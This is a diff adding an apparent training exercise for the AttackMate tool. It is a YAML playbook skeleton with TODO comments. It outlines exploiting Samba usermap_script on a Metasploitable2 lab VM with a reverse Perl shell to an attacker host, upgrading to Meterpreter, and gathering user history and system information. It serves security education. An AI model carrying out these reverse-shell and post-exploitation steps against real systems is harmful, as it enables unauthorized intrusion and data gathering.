@@ -1,0 +1,84 @@
+#
+# Exercise 3: Shell to Meterpreter Upgrade
+# Difficulty: Intermediate
+#
+# Description:
+#     Starting from the Samba usermap_script exploit, upgrade the resulting
+#     raw shell session to a full Meterpreter session and extract system
+#     information using stdapi commands and post modules.
+#
+#     This exercise practices:
+#     - msf-module exploit to get a raw shell
+#     - $LAST_MSF_SESSION builtin
+#     - post/multi/manage/shell_to_meterpreter
+#     - msf-session with stdapi: True
+#     - Multiple post exploitation modules
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml exercise_03_meterpreter_upgrade.yml
+#
+# Instructions:
+#     1. Replace CHANGE_ME and CHANGE_ME_ATTACKER with your actual IPs
+#     2. Fill in all TODO sections
+#     3. Run the playbook and verify you get a Meterpreter session with full output
+#
+# Hint: Check handout 04_shell_upgrades_post_exploitation.md and walkthrough 03 if stuck.
+#
+
+vars:
+  TARGET: CHANGE_ME
+  ATTACKER: CHANGE_ME_ATTACKER
+  PAYLOAD_INITIAL: cmd/unix/reverse_perl
+  LPORT_INITIAL: "4422"
+  LPORT_UPGRADE: "4433"
+
+commands:
+  # ============================================
+  # PHASE 1: Get a Raw Shell
+  # ============================================
+
+  # TODO 1: Use msf-module to exploit the Samba usermap_script vulnerability:
+  #          Module:  exploit/multi/samba/usermap_script
+  #          Payload: cmd/unix/reverse_perl
+  #          payload_options: LHOST=$ATTACKER, LPORT=$LPORT_INITIAL
+  #          options: RHOSTS=$TARGET
+  #          Name the session "shell"
+
+  # TODO 2: Run "id" in the shell session to verify access
+
+  # TODO 3: Print the result with debug
+
+  # ============================================
+  # PHASE 2: Upgrade to Meterpreter
+  # ============================================
+
+  # TODO 4: Use msf-module to run post/multi/manage/shell_to_meterpreter
+  #          - options: SESSION must be set to $LAST_MSF_SESSION
+  #          - payload: linux/x86/meterpreter/reverse_tcp
+  #          - payload_options: LHOST=$ATTACKER, LPORT=$LPORT_UPGRADE
+  #          - creates_session: meterpreter
+
+  # TODO 5: Sleep for 2 seconds to let the Meterpreter session initialize
+
+  # ============================================
+  # PHASE 3: Meterpreter Post-Exploitation
+  # ============================================
+
+  # TODO 6: Use msf-session with stdapi: True to run "sysinfo"
+  #          on the "meterpreter" session. Print the result.
+
+  # TODO 7: Use msf-session with stdapi: True to run "getuid"
+  #          on the "meterpreter" session. Print the result.
+
+  # TODO 8: Use msf-session with stdapi: True to run "ps"
+  #          on the "meterpreter" session.
+
+  # ============================================
+  # PHASE 4: Post Modules
+  # ============================================
+
+  # TODO 9: Run post/linux/gather/enum_users_history against $LAST_MSF_SESSION
+
+  # TODO 10: Run post/linux/gather/enum_protections against $LAST_MSF_SESSION
